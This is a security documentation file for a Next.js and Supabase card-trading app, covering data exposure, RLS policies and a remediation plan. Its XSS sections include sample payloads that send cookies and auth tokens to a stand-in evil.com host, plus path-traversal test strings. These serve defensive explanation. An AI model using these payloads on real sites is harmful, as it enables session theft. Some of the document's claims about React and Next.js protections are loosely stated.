# Security Documentation

## Overview

This document provides a comprehensive analysis of the security posture of the RifTrade application, including what data is stored, how it's protected, and potential security considerations.

---

## 1. Data Classification

### 1.1 Publicly Accessible Data (By Design)

The following data is **intentionally public** and accessible to all users (including unauthenticated users):

- **Display Name** (`profiles.display_name`)
  - Purpose: User identification in the trading community
  - Visibility: All users can see all display names
  - Risk Level: Low (users choose what to display)

- **Contact Information** (`profiles.contact_info`)
  - Purpose: Required for matchmaking - users need to contact each other to arrange trades
  - Visibility: All users can see all contact information
  - Risk Level: **Medium-High** (may contain phone numbers, emails, social handles)
  - **Important**: Users should be aware this is public and choose what information to share

- **Trading Locations** (`profiles.trading_locations`)
  - Purpose: Indicate where users are available for in-person trades
  - Visibility: All users can see all trading locations
  - Risk Level: Medium (location data)

- **Username** (`profiles.username`)
  - Purpose: Public profile URL identifier
  - Visibility: All users can see all usernames
  - Risk Level: Low (chosen by user)

- **Card Collections** (`profile_have_cards`, `profile_want_cards`)
  - Purpose: Core functionality - shows what cards users have/want
  - Visibility: All users can see all card collections
  - Risk Level: Low (non-sensitive trading data)

### 1.2 Private Data

The following data is **private** and protected:

- **Email Address** (`auth.users.email`)
  - Storage: Supabase Auth system (separate from profiles table)
  - Visibility: Only accessible to the user themselves
  - Protection: Supabase Auth handles this securely
  - Risk Level: Low (properly protected by Supabase)

- **User ID** (`profiles.user_id`, `auth.users.id`)
  - Storage: UUID references to Supabase Auth
  - Visibility: Not directly exposed, but can be inferred from profile relationships
  - Protection: UUIDs are not guessable, but not secret
  - Risk Level: Low

- **Password Hashes**
  - Storage: Supabase Auth system
  - Visibility: Never exposed, handled entirely by Supabase
  - Protection: Industry-standard bcrypt hashing
  - Risk Level: Low (properly protected by Supabase)

- **Match Notifications** (`user_matches`)
  - Visibility: Users can only see their own matches
  - Protection: Row Level Security (RLS) policies
  - Risk Level: Low

---

## 2. Authentication Security

### 2.1 Supabase Auth

- **Provider**: Supabase Auth (managed service)
- **Method**: Email/Password authentication
- **Email Verification**: Disabled (users can use any email format)
- **Password Requirements**: Enforced by Supabase (minimum complexity)
- **Session Management**: Handled by Supabase (JWT tokens)
- **Password Storage**: Bcrypt hashing (industry standard)

### 2.2 Security Features

✅ **Strengths**:
- Passwords are never stored in plain text
- Session tokens are HTTP-only cookies (when using Supabase Auth helpers)
- Password reset functionality available
- Account deletion cascades properly (removes all user data)

⚠️ **Considerations**:
- Email verification is disabled (users can use fake emails)
- No 2FA/MFA implemented
- No rate limiting on login attempts (handled by Supabase, but check settings)
- No account lockout after failed attempts (check Supabase settings)

---

## 3. Database Security

### 3.1 Row Level Security (RLS)

All tables have RLS enabled with the following policies:

#### Profiles Table
- **SELECT**: ✅ Everyone can read all profiles (by design)
- **INSERT**: ✅ Users can only create their own profile
- **UPDATE**: ✅ Users can only update their own profile
- **DELETE**: ❌ Not explicitly allowed (cascade deletes via auth.users)

#### Profile Cards Tables (`profile_have_cards`, `profile_want_cards`)
- **SELECT**: ✅ Everyone can read all card collections (by design)
- **INSERT/UPDATE/DELETE**: ✅ Users can only modify their own cards

#### User Matches Table (`user_matches`)
- **SELECT**: ✅ Users can only read their own matches
- **INSERT**: ✅ Users can only create matches for themselves
- **UPDATE**: ✅ Users can only update their own matches
- **DELETE**: ✅ Users can only delete their own matches

### 3.2 Database Access

- **Direct Client Access**: Frontend queries Supabase directly (no API layer)
- **Protection**: RLS policies enforce all security rules
- **Connection**: HTTPS only (enforced by Supabase)
- **SQL Injection**: Protected by Supabase client library (parameterized queries)

---

## 4. API Keys and Credentials

### 4.1 Exposed Keys (By Design)

The following are **intentionally public** and visible in client-side code:

- **Supabase URL** (`NEXT_PUBLIC_SUPABASE_URL`)
  - Example: `https://xxxxx.supabase.co`
  - Visibility: Public (in browser, network requests)
  - Risk: Low (public endpoint, protected by RLS)

- **Supabase Anon Key** (`NEXT_PUBLIC_SUPABASE_ANON_KEY`)
  - Visibility: Public (in browser, network requests)
  - Risk: Low (designed to be public, RLS protects data)
  - **Important**: This key can only perform operations allowed by RLS policies

### 4.2 Protected Keys

- **Supabase Service Role Key**: Not used in this application
- **Database Passwords**: Managed by Supabase, never exposed
- **Third-party API Keys**: None currently used

### 4.3 Key Security Best Practices

✅ **Current Implementation**:
- Public keys are in environment variables (not hardcoded)
- No service role keys exposed to client
- RLS policies limit what anon key can do

⚠️ **Recommendations**:
- Rotate Supabase keys periodically (via Supabase dashboard)
- Monitor Supabase dashboard for unusual activity
- Never commit `.env.local` files to git (already in `.gitignore`)

---

## 5. Client-Side Security

### 5.1 Data Exposure

- **Network Requests**: All Supabase queries are visible in browser DevTools
  - Users can see what data is being fetched
  - This is expected behavior for a public directory app

- **Source Code**: Next.js code is visible in browser (minified in production)
  - Environment variables prefixed with `NEXT_PUBLIC_` are embedded in bundle
  - This is standard for Next.js applications

### 5.2 XSS Protection

- **React**: Automatically escapes user input in JSX
- **Input Validation**: Basic validation on forms (username format, etc.)
- **No User-Generated HTML**: Users cannot inject HTML/JavaScript

⚠️ **Considerations**:
- Contact info is displayed as-is (users could include malicious content)
- Consider sanitizing contact_info before display
- Trading locations are displayed as-is

### 5.3 CSRF Protection

- **Supabase**: Uses JWT tokens for authentication
- **Next.js**: Built-in CSRF protection for form submissions
- **API Calls**: Supabase client handles CSRF protection

---

## 6. Privacy Considerations

### 6.1 User Privacy

**What Users Should Know**:
- ✅ Their email address is private (not visible to other users)
- ⚠️ Their display name is public
- ⚠️ **Their contact information is PUBLIC** (required for matchmaking)
- ⚠️ Their card collections are public
- ⚠️ Their trading locations are public

**Recommendations for Users**:
- Use a display name that doesn't reveal personal information
- Consider using a dedicated contact method (e.g., trading-specific Telegram) rather than personal phone/email
- Be aware that all profile information is searchable and visible to everyone

### 6.2 Data Retention

- **Account Deletion**: When a user deletes their account, all associated data is deleted (cascade)
- **Profile Data**: Persists until user deletes account
- **Match Data**: Persists until user deletes account or matches are removed

### 6.3 Data Export

- **Current**: No data export functionality
- **Future Consideration**: Users may want to export their data (GDPR compliance)

---

## 7. Security Vulnerabilities & Mitigations

### 7.1 Known Risks

| Risk | Severity | Mitigation | Status |
|------|----------|------------|--------|
| Contact info is public | Medium | User education, optional privacy settings | ⚠️ Acceptable risk (by design) |
| No email verification | Low | Users can use fake emails | ✅ Acceptable (reduces friction) |
| No rate limiting on API | Medium | Supabase handles basic rate limiting | ⚠️ Monitor usage |
| No input sanitization on contact_info | Low-Medium | Consider sanitizing before display | ⚠️ Should implement |
| No 2FA/MFA | Low | Not critical for trading directory | ✅ Acceptable for MVP |
| Profile data scraping | Low | Public data, expected behavior | ✅ Acceptable (by design) |

### 7.2 Potential Attack Vectors

1. **Profile Spam/Abuse**
   - Risk: Users creating fake profiles
   - Mitigation: Email verification (if enabled), manual moderation
   - Current: No protection (low priority for MVP)

2. **Contact Info Abuse**
   - Risk: Spam, harassment via public contact info
   - Mitigation: User education, report/block functionality (future)
   - Current: No protection (users choose what to share)

3. **Data Scraping**
   - Risk: Bulk collection of user data
   - Mitigation: Rate limiting (Supabase), monitoring
   - Current: Basic protection via Supabase

4. **SQL Injection**
   - Risk: Low (Supabase client uses parameterized queries)
   - Mitigation: Supabase client library protection
   - Current: ✅ Protected

5. **XSS Attacks**
   - Risk: Low-Medium (contact_info displayed as-is)
   - Mitigation: React escaping, input sanitization
   - Current: ⚠️ Partially protected (should sanitize contact_info)

---

## 8. Compliance & Legal

### 8.1 GDPR Considerations

- **Right to Access**: Users can view their data via profile page
- **Right to Deletion**: Users can delete their account (removes all data)
- **Right to Portability**: Not currently implemented (future consideration)
- **Data Processing**: Minimal (no analytics, no third-party tracking)

### 8.2 Terms of Service

- Users should be informed that:
  - Contact information is public
  - Profile data is searchable
  - Account deletion is permanent
  - No guarantees about trade safety

---

## 9. Security Best Practices for Users

### 9.1 Recommendations

1. **Use a Trading-Specific Contact Method**
   - Create a separate Telegram/Discord account for trading
   - Use a dedicated email for trading
   - Avoid sharing personal phone numbers

2. **Choose Display Names Carefully**
   - Don't use your real name if privacy is a concern
   - Don't include personal information

3. **Be Cautious with Trading Locations**
   - Use general areas (city names) rather than specific addresses
   - Consider meeting in public places

4. **Monitor Your Profile**
   - Regularly check what information is visible
   - Update contact info if needed
   - Delete account if you no longer want to trade

---

## 10. Security Monitoring & Maintenance

### 10.1 Current Monitoring

- **Supabase Dashboard**: Monitor for unusual activity
- **Vercel Logs**: Check for errors/attacks
- **Manual Review**: Periodic check of user profiles

### 10.2 Recommended Monitoring

- Set up Supabase alerts for:
  - Unusual query patterns
  - Failed authentication attempts
  - Rate limit violations
- Regular security audits
- Dependency updates (check for vulnerabilities)

### 10.3 Maintenance Tasks

- ✅ Keep dependencies updated
- ✅ Monitor Supabase for security updates
- ✅ Review RLS policies periodically
- ⚠️ Consider implementing input sanitization
- ⚠️ Consider adding rate limiting
- ⚠️ Consider adding user reporting/blocking

---

## 11. Security Summary

### 11.1 Overall Security Level: **Medium**

**Strengths**:
- ✅ Strong authentication (Supabase Auth)
- ✅ Row Level Security on all tables
- ✅ No sensitive data exposed unnecessarily
- ✅ HTTPS enforced
- ✅ Password hashing handled securely

**Weaknesses**:
- ⚠️ Contact information is public (by design, but users should be aware)
- ⚠️ No input sanitization on user-generated content
- ⚠️ No rate limiting beyond Supabase defaults
- ⚠️ No email verification (allows fake accounts)

### 11.2 Risk Assessment

**For Users**:
- **Low Risk**: Email addresses, passwords, account data
- **Medium Risk**: Contact information (public by design)
- **Acceptable Risk**: Public profile data (required for matchmaking)

**For Application**:
- **Low Risk**: SQL injection, XSS (mostly protected)
- **Medium Risk**: Profile spam, data scraping
- **Acceptable Risk**: Public data exposure (by design)

---

## 12. Recommendations for Improvement

### 12.1 High Priority

1. **Input Sanitization**
   - Sanitize `contact_info` before display
   - Sanitize `trading_locations` before display
   - Prevent XSS attacks

2. **User Education**
   - Add privacy notice on signup
   - Explain what data is public
   - Provide privacy tips

### 12.2 Medium Priority

1. **Rate Limiting**
   - Implement stricter rate limits
   - Monitor for abuse patterns

2. **Content Moderation**
   - Report/flag functionality
   - Admin moderation tools

### 12.3 Low Priority

1. **Email Verification** (optional)
   - Reduce fake accounts
   - Improve trust

2. **2FA/MFA** (optional)
   - Additional account security
   - Not critical for trading directory

---

## 13. Incident Response

### 13.1 If a Security Issue is Discovered

1. **Immediate Actions**:
   - Assess the severity
   - If critical, temporarily disable affected features
   - Notify affected users if necessary

2. **Investigation**:
   - Review Supabase logs
   - Check for data breaches
   - Identify root cause

3. **Remediation**:
   - Fix the vulnerability
   - Update security documentation
   - Deploy fix

4. **Communication**:
   - Inform users if data was compromised
   - Provide guidance on next steps

---

## 14. Conclusion

The RifTrade application uses industry-standard security practices with Supabase Auth and Row Level Security. The primary security consideration is that **contact information is intentionally public** to enable matchmaking, which users should be aware of.

The application is suitable for a community trading directory, but users should exercise caution when sharing personal contact information and consider using trading-specific contact methods.

**Security Level**: Appropriate for a public trading directory application with proper user education about data visibility.

---

## 15. Security Vulnerabilities & Fixes

### 15.1 Critical & High Priority Issues

#### ⚠️ XSS (Cross-Site Scripting) Attacks
**Risk Level**: Medium-High  
**Affected Fields**: `contact_info`, `display_name`, `trading_locations`, `username`

**Issue**:
- User-generated content is displayed directly in React components without sanitization
- While React escapes HTML by default, malicious scripts could still be injected via:
  - JavaScript event handlers in links: `<a href="javascript:alert('XSS')">`
  - Image sources: `<img src="x" onerror="malicious_code()">`
  - Data URIs: `data:text/html,<script>alert('XSS')</script>`
  - SVG files with embedded scripts

**Current Protection**:
- ✅ React automatically escapes HTML entities in JSX
- ⚠️ Links and URLs are not sanitized
- ⚠️ No Content Security Policy (CSP) headers

**How to Fix**:
```typescript
// Install DOMPurify: npm install dompurify @types/dompurify
import DOMPurify from 'dompurify';

// Sanitize before display
const safeContactInfo = DOMPurify.sanitize(profile.contact_info, {
  ALLOWED_TAGS: [], // No HTML tags allowed
  ALLOWED_ATTR: []
});

// Or use a library like react-html-parser with sanitization
```

**Recommended Actions**:
1. Install and use DOMPurify for all user-generated content
2. Add Content Security Policy headers in `next.config.mjs`
3. Validate URLs if allowing links in contact_info
4. Consider markdown parsing with sanitization if rich text is needed

---

#### ⚠️ SQL Injection
**Risk Level**: Low (but worth verifying)

**Issue**:
- Username comes from URL parameters: `/app/[username]/page.tsx`
- Used in query: `.ilike('username', username.toLowerCase())`
- If Supabase client has a bug or misconfiguration, could be vulnerable

**Current Protection**:
- ✅ Supabase client uses parameterized queries (should be safe)
- ✅ Username is validated (alphanumeric, underscore, hyphen only)
- ✅ Username is lowercased before use
- ⚠️ No additional validation on URL parameter

**How to Fix**:
```typescript
// Add strict validation on username from URL
const username = params?.username as string;

// Validate format before using
if (!username || !/^[a-zA-Z0-9_-]+$/.test(username)) {
  setNotFound(true);
  return;
}

// Limit length
if (username.length > 30) {
  setNotFound(true);
  return;
}
```

**Recommended Actions**:
1. Add URL parameter validation in `[username]/page.tsx`
2. Verify Supabase client always uses parameterized queries (it does)
3. Consider using Supabase RPC functions for complex queries

---

#### ⚠️ Email Privacy & Unauthorized Access
**Risk Level**: Low (but important to verify)

**Issue**:
- Users might try to query `auth.users` table directly
- Could attempt to enumerate emails or user IDs

**Current Protection**:
- ✅ `auth.users` table is NOT accessible via Supabase client (separate auth system)
- ✅ Only `supabase.auth.getUser()` returns current user's email
- ✅ RLS policies don't apply to `auth.users` (it's in auth schema, not public)
- ✅ Email is never exposed in profile queries

**Verification**:
- ✅ Users CANNOT execute: `supabase.from('auth.users').select('*')` (table doesn't exist in public schema)
- ✅ Users CANNOT query other users' emails
- ✅ Email is only accessible via authenticated `getUser()` call

**How to Verify**:
```typescript
// This will fail - auth.users is not accessible
const { data } = await supabase.from('auth.users').select('*');
// Error: relation "public.auth.users" does not exist

// This only returns current user
const { data: { user } } = await supabase.auth.getUser();
// Only returns authenticated user's data
```

**Recommended Actions**:
1. ✅ Already protected (no action needed)
2. Monitor Supabase logs for attempts to access auth tables
3. Consider rate limiting on auth endpoints

---

### 15.2 Medium Priority Issues

#### ⚠️ Username Enumeration
**Risk Level**: Low-Medium

**Issue**:
- Attackers can try different usernames in URL: `/username1`, `/username2`, etc.
- Can determine which usernames exist by checking if profile loads
- Could be used for targeted attacks or spam

**Current Protection**:
- ⚠️ No rate limiting on profile views
- ⚠️ No CAPTCHA or bot protection
- ⚠️ Username existence is discoverable

**How to Fix**:
```typescript
// Option 1: Rate limiting (Supabase or Vercel)
// Option 2: Add CAPTCHA for suspicious activity
// Option 3: Add delay for failed username lookups
// Option 4: Use consistent error messages (don't reveal if username exists)
```

**Recommended Actions**:
1. Implement rate limiting on profile view endpoints
2. Use consistent "not found" messages (don't reveal if username exists)
3. Add monitoring for enumeration attempts
4. Consider requiring authentication to view profiles (reduces enumeration)

---

#### ⚠️ Path Traversal & Open Redirects
**Risk Level**: Low-Medium

**Issue**:
- Username in URL: `/[username]`
- If username contains `../` or special characters, could attempt path traversal
- If username is a URL, could be used for open redirects

**Current Protection**:
- ✅ Username is validated (alphanumeric, underscore, hyphen only)
- ✅ Username is lowercased
- ⚠️ No additional URL encoding/decoding validation

**How to Fix**:
```typescript
// Already protected by username validation, but add extra checks:
const username = decodeURIComponent(params?.username as string);

// Validate after decoding
if (username.includes('/') || username.includes('..') || username.includes('\\')) {
  setNotFound(true);
  return;
}
```

**Recommended Actions**:
1. ✅ Already mostly protected (username validation prevents most issues)
2. Add explicit path traversal checks
3. Validate URL encoding/decoding

---

#### ⚠️ Mass Assignment / Parameter Pollution
**Risk Level**: Low

**Issue**:
- Profile update accepts `updateData` object
- If user could manipulate request, could update fields they shouldn't

**Current Protection**:
- ✅ Only specific fields are included in `updateData`
- ✅ RLS policies prevent updating other users' profiles
- ⚠️ No explicit field whitelist validation

**How to Fix**:
```typescript
// Explicitly whitelist allowed fields
const allowedFields = ['display_name', 'contact_info', 'trading_locations', 'username'];
const updateData: Record<string, any> = {};

allowedFields.forEach(field => {
  if (field === 'display_name' && displayName) updateData.display_name = displayName;
  if (field === 'contact_info' && contactInfo) updateData.contact_info = contactInfo;
  // etc.
});
```

**Recommended Actions**:
1. Use explicit field whitelisting
2. Validate data types before update
3. Consider using Zod or similar for schema validation

---

#### ⚠️ Clickjacking Protection
**Risk Level**: Low-Medium

**Issue**:
- Site could be embedded in iframe on malicious site
- Users might be tricked into actions

**Current Protection**:
- ⚠️ No X-Frame-Options header
- ⚠️ No Content Security Policy frame-ancestors

**How to Fix**:
```javascript
// In next.config.mjs
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'X-Frame-Options',
          value: 'DENY'
        },
        {
          key: 'Content-Security-Policy',
          value: "frame-ancestors 'none'"
        }
      ]
    }
  ];
}
```

**Recommended Actions**:
1. Add X-Frame-Options header
2. Add CSP frame-ancestors directive
3. Consider allowing embedding only from trusted domains if needed

---

### 15.3 Low Priority Issues

#### ⚠️ Rate Limiting
**Risk Level**: Low-Medium

**Issue**:
- No rate limiting on API calls
- Could be used for scraping or DoS

**Current Protection**:
- ✅ Supabase has basic rate limiting
- ⚠️ No application-level rate limiting
- ⚠️ No per-user rate limits

**How to Fix**:
```typescript
// Option 1: Use Supabase rate limiting (configure in dashboard)
// Option 2: Implement middleware rate limiting
// Option 3: Use Vercel Edge Middleware for rate limiting
```

**Recommended Actions**:
1. Configure Supabase rate limits
2. Add application-level rate limiting for sensitive operations
3. Monitor for abuse patterns

---

#### ⚠️ CSRF (Cross-Site Request Forgery)
**Risk Level**: Low

**Issue**:
- Form submissions could be triggered from other sites

**Current Protection**:
- ✅ Supabase uses JWT tokens (CSRF-resistant)
- ✅ Next.js has built-in CSRF protection
- ⚠️ No explicit CSRF tokens

**How to Fix**:
- ✅ Already protected (Supabase JWT + Next.js)
- Consider adding SameSite cookie attributes if using cookies

**Recommended Actions**:
1. ✅ Already mostly protected
2. Verify Supabase session handling
3. Monitor for CSRF attempts

---

#### ⚠️ Session Management
**Risk Level**: Low

**Issue**:
- Session tokens stored in browser
- Could be stolen via XSS

**Current Protection**:
- ✅ Supabase handles session management
- ✅ Tokens are HTTP-only when using auth helpers
- ⚠️ No explicit session timeout

**How to Fix**:
```typescript
// Configure session timeout in Supabase
// Add session refresh logic
// Implement logout on inactivity
```

**Recommended Actions**:
1. Configure session timeout in Supabase dashboard
2. Add automatic session refresh
3. Implement logout on browser close (optional)

---

#### ⚠️ Content Security Policy (CSP)
**Risk Level**: Low-Medium

**Issue**:
- No CSP headers to prevent XSS
- External resources (images, scripts) not restricted

**Current Protection**:
- ⚠️ No CSP headers configured
- ⚠️ External images loaded without restrictions

**How to Fix**:
```javascript
// In next.config.mjs
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // Next.js needs unsafe-eval in dev
            "style-src 'self' 'unsafe-inline'", // Tailwind needs unsafe-inline
            "img-src 'self' data: https:",
            "connect-src 'self' https://*.supabase.co",
            "frame-ancestors 'none'"
          ].join('; ')
        }
      ]
    }
  ];
}
```

**Recommended Actions**:
1. Add CSP headers
2. Test thoroughly (CSP can break functionality if too strict)
3. Use report-only mode first

---

### 15.4 Immediate Actions (High Priority) - Detailed Analysis

#### Issue #1: XSS Attacks via User-Generated Content

**What is it?**
Cross-Site Scripting (XSS) attacks occur when malicious scripts are injected into web pages viewed by other users. In our application, user-generated content (display_name, contact_info, trading_locations) is displayed directly in React components without sanitization.

**What does it mean?**
While React automatically escapes HTML entities in JSX (converting `<` to `&lt;`), there are still ways attackers can inject malicious code:
- **JavaScript URLs**: `<a href="javascript:alert('XSS')">Click me</a>`
- **Event Handlers**: `<img src="x" onerror="malicious_code()">`
- **Data URIs**: `data:text/html,<script>alert('XSS')</script>`
- **SVG with Scripts**: SVG files can contain embedded JavaScript
- **Link Injection**: Malicious links that redirect to phishing sites

**Attack Flow Example:**
1. Attacker creates a profile with malicious contact_info:
   ```
   Contact: <img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
   ```
2. When another user views the attacker's profile, the image fails to load
3. The `onerror` handler executes, sending the user's session cookie to the attacker's server
4. Attacker can now impersonate the user

**Another Attack Flow:**
1. Attacker sets display_name to: `John<script>fetch('https://evil.com/steal?data='+localStorage.getItem('supabase.auth.token'))</script>`
2. While React escapes this, if there's any place where HTML is rendered (like markdown or rich text), it could execute
3. Attacker steals authentication tokens

**Current Vulnerability Points:**
- `app/[username]/page.tsx`: Line 264 - `{profile.contact_info}` displayed directly
- `app/[username]/page.tsx`: Line 252 - `{profile.display_name}` displayed directly  
- `app/[username]/page.tsx`: Line 216 - `{profile.trading_locations}` displayed directly
- `app/search/page.tsx`: Line 402 - `{result.profile.contact_info}` displayed directly
- `app/search/page.tsx`: Line 391 - `{result.profile.display_name}` displayed directly
- `components/NotificationBell.tsx`: Line 233 - `{match.matched_profile.display_name}` displayed directly

**How to Fix:**
1. Install DOMPurify: `npm install dompurify @types/dompurify`
2. Create a sanitization utility function
3. Sanitize all user-generated content before display
4. For contact_info that might contain URLs, validate URLs separately

**Implementation To-Do List:**
- [ ] Install DOMPurify package (`npm install dompurify @types/dompurify`)
- [ ] Create `lib/sanitize.ts` utility file with sanitization functions
- [ ] Create `sanitizeText()` function for plain text fields (display_name, trading_locations)
- [ ] Create `sanitizeContactInfo()` function for contact_info (may contain URLs)
- [ ] Update `app/[username]/page.tsx` to sanitize profile.display_name before display
- [ ] Update `app/[username]/page.tsx` to sanitize profile.contact_info before display
- [ ] Update `app/[username]/page.tsx` to sanitize profile.trading_locations before display
- [ ] Update `app/search/page.tsx` to sanitize result.profile.display_name before display
- [ ] Update `app/search/page.tsx` to sanitize result.profile.contact_info before display
- [ ] Update `components/NotificationBell.tsx` to sanitize match.matched_profile.display_name
- [ ] Test with malicious input to verify sanitization works
- [ ] Update SECURITY.md to mark this as fixed

---

#### Issue #2: URL Parameter Validation for Username

**What is it?**
The username comes from the URL path parameter (`/[username]`). If not properly validated, it could be used for attacks like path traversal, open redirects, or breaking the application logic.

**What does it mean?**
Next.js route parameters are extracted from the URL. An attacker could manipulate the URL to include:
- **Path Traversal**: `../../../etc/passwd` or `../../admin`
- **Special Characters**: `username<script>alert('XSS')</script>`
- **URL Encoding Tricks**: `username%2F..%2Fadmin` (decodes to `username/../admin`)
- **Very Long Strings**: Could cause performance issues or buffer overflows
- **Null Bytes**: `username%00` could break string handling

**Attack Flow Example:**
1. Attacker navigates to: `https://yourapp.com/../../../admin`
2. If validation is weak, the app might try to query: `.ilike('username', '../../../admin')`
3. While Supabase should handle this safely, it's still a security risk
4. Could also break the UI or cause errors

**Another Attack Flow:**
1. Attacker uses URL encoding: `https://yourapp.com/username%2F..%2Ftest`
2. After URL decoding, becomes: `username/../test`
3. If not validated, could cause routing issues or errors
4. Could be used to probe for other routes or admin panels

**Current Vulnerability Points:**
- `app/[username]/page.tsx`: Line 15 - `const username = params?.username as string;`
- `app/[username]/page.tsx`: Line 53 - `.ilike('username', username.toLowerCase())` - used directly in query

**Current Protection:**
- ✅ Username is lowercased before use
- ⚠️ No format validation on URL parameter
- ⚠️ No length validation
- ⚠️ No path traversal checks
- ⚠️ No URL decoding validation

**How to Fix:**
1. Add strict validation function for username format
2. Validate length (3-30 characters)
3. Check for path traversal patterns (`..`, `/`, `\`)
4. Validate after URL decoding
5. Return 404 early if validation fails

**Implementation To-Do List:**
- [ ] Create `lib/validate-username.ts` utility function
- [ ] Add `validateUsernameFromUrl()` function that:
  - [ ] Decodes URL parameter properly
  - [ ] Checks length (3-30 characters)
  - [ ] Validates format (alphanumeric, underscore, hyphen only)
  - [ ] Checks for path traversal patterns (`..`, `/`, `\`, `%`)
  - [ ] Checks for null bytes
  - [ ] Returns validation result
- [ ] Update `app/[username]/page.tsx` to validate username before using it
- [ ] Set `notFound(true)` immediately if validation fails
- [ ] Add error logging for invalid username attempts
- [ ] Test with various malicious inputs:
  - [ ] `../../../admin`
  - [ ] `username<script>alert('XSS')</script>`
  - [ ] `username%2F..%2Ftest`
  - [ ] Very long strings (100+ characters)
  - [ ] Null bytes
- [ ] Update SECURITY.md to mark this as fixed

---

#### Issue #3: Missing Security Headers (X-Frame-Options & CSP)

**What is it?**
Security headers tell browsers how to handle your website. Missing headers can allow clickjacking attacks, XSS attacks, and other security issues.

**What does it mean?**

**X-Frame-Options:**
- Prevents your site from being embedded in an iframe on another site
- Without it, attackers can embed your site and trick users into clicking things
- Options: `DENY` (never allow), `SAMEORIGIN` (only same domain), or specific domains

**Content Security Policy (CSP):**
- Tells browser which resources (scripts, styles, images) are allowed to load
- Prevents XSS by blocking inline scripts and unauthorized sources
- Can prevent data exfiltration attacks

**Attack Flow Example (Clickjacking):**
1. Attacker creates a malicious website
2. Embeds your site in an invisible iframe: `<iframe src="https://yourapp.com/profile" style="opacity:0"></iframe>`
3. Overlays fake buttons on top of your site
4. User thinks they're clicking "View Profile" but actually clicks "Delete Account"
5. User's account is deleted without realizing it

**Attack Flow Example (CSP Bypass):**
1. Without CSP, attacker injects script via XSS: `<script src="https://evil.com/steal.js"></script>`
2. Browser loads and executes the malicious script
3. Script steals user data, session tokens, etc.
4. With CSP, browser would block the script from loading

**Current Vulnerability:**
- ⚠️ No security headers configured in `next.config.mjs`
- ⚠️ Site can be embedded in iframes (clickjacking risk)
- ⚠️ No CSP to prevent XSS and data exfiltration

**How to Fix:**
1. Add security headers to `next.config.mjs`
2. Configure X-Frame-Options: DENY
3. Configure Content-Security-Policy with appropriate directives
4. Test that the site still works with CSP (can be strict)

**Implementation To-Do List:**
- [ ] Open `next.config.mjs` file
- [ ] Add `headers()` function to Next.js config
- [ ] Add X-Frame-Options header: `DENY`
- [ ] Add X-Content-Type-Options header: `nosniff`
- [ ] Add Referrer-Policy header: `strict-origin-when-cross-origin`
- [ ] Add Content-Security-Policy header with:
  - [ ] `default-src 'self'` (only allow resources from same origin)
  - [ ] `script-src 'self' 'unsafe-eval' 'unsafe-inline'` (Next.js needs unsafe-eval in dev, unsafe-inline for inline scripts)
  - [ ] `style-src 'self' 'unsafe-inline'` (Tailwind CSS needs unsafe-inline)
  - [ ] `img-src 'self' data: https:` (allow images from same origin, data URIs, and HTTPS URLs for card images)
  - [ ] `connect-src 'self' https://*.supabase.co` (allow API calls to Supabase)
  - [ ] `frame-ancestors 'none'` (prevent embedding)
- [ ] Test the application thoroughly:
  - [ ] Verify pages load correctly
  - [ ] Verify images load (card images from external URLs)
  - [ ] Verify Supabase API calls work
  - [ ] Verify no console errors about CSP violations
- [ ] If CSP is too strict and breaks functionality:
  - [ ] Start with report-only mode: `Content-Security-Policy-Report-Only`
  - [ ] Monitor reports and adjust gradually
  - [ ] Or use a more permissive CSP initially
- [ ] Update SECURITY.md to mark this as fixed

---

#### Issue #4: Input Sanitization on Save (contact_info, display_name, trading_locations)

**What is it?**
When users save their profile information, we should sanitize the input before storing it in the database. This prevents malicious content from being stored and displayed later.

**What does it mean?**
Currently, when users enter their contact_info, display_name, or trading_locations, the data is saved directly to the database without sanitization. While we sanitize on display (Issue #1), it's better to sanitize on input as well:
- **Defense in Depth**: Multiple layers of protection
- **Data Integrity**: Clean data in database
- **Performance**: Sanitize once on save, not every time on display
- **Prevents Storage Attacks**: Even if display sanitization fails, data is clean

**Attack Flow Example:**
1. Attacker enters malicious contact_info: `<script>alert('XSS')</script>`
2. Data is saved to database as-is
3. If display sanitization has a bug or is bypassed, malicious code executes
4. Even if sanitized on display, having clean data in DB is safer

**Another Attack Flow:**
1. Attacker enters very long string (10,000+ characters) in display_name
2. Could cause:
   - Database storage issues
   - Performance problems when loading profiles
   - UI breaking when displaying
   - Denial of Service (DoS) attacks

**Current Vulnerability Points:**
- `app/profile/page.tsx`: Line 275 - `display_name: displayName` saved directly
- `app/profile/page.tsx`: Line 276 - `contact_info: contactInfo` saved directly
- `app/profile/page.tsx`: Line 277 - `trading_locations: tradingLocations` saved directly
- `app/login/page.tsx`: Line 120 - `display_name: username` saved directly
- `app/login/page.tsx`: Line 121 - `contact_info: email` saved directly

**Current Protection:**
- ✅ Basic validation (required fields, username format)
- ⚠️ No length limits on display_name, contact_info, trading_locations
- ⚠️ No sanitization before save
- ⚠️ No HTML/strip tags before save

**How to Fix:**
1. Sanitize all user inputs before saving to database
2. Strip HTML tags and dangerous content
3. Add length limits (reasonable limits)
4. Validate format (e.g., contact_info might allow URLs but validate them)

**Implementation To-Do List:**
- [ ] Create `lib/sanitize-input.ts` utility file
- [ ] Create `sanitizeDisplayName()` function:
  - [ ] Strip all HTML tags
  - [ ] Limit length to 100 characters
  - [ ] Trim whitespace
  - [ ] Return sanitized string
- [ ] Create `sanitizeContactInfo()` function:
  - [ ] Strip HTML tags but preserve URLs if needed
  - [ ] Limit length to 500 characters
  - [ ] Validate URLs if present (optional)
  - [ ] Trim whitespace
- [ ] Create `sanitizeTradingLocations()` function:
  - [ ] Strip all HTML tags
  - [ ] Limit length to 200 characters
  - [ ] Trim whitespace
- [ ] Update `app/profile/page.tsx` `handleSave()` function:
  - [ ] Sanitize `displayName` before saving
  - [ ] Sanitize `contactInfo` before saving
  - [ ] Sanitize `tradingLocations` before saving
- [ ] Update `app/login/page.tsx` signup function:
  - [ ] Sanitize `username` before using as display_name
  - [ ] Sanitize `email` before using as contact_info
- [ ] Add database constraints (optional but recommended):
  - [ ] Add length limits in migration: `VARCHAR(100)` for display_name
  - [ ] Add length limits: `VARCHAR(500)` for contact_info
  - [ ] Add length limits: `VARCHAR(200)` for trading_locations
- [ ] Test with malicious inputs:
  - [ ] HTML tags: `<script>alert('XSS')</script>`
  - [ ] Very long strings (1000+ characters)
  - [ ] Special characters
  - [ ] URLs in contact_info
- [ ] Update SECURITY.md to mark this as fixed

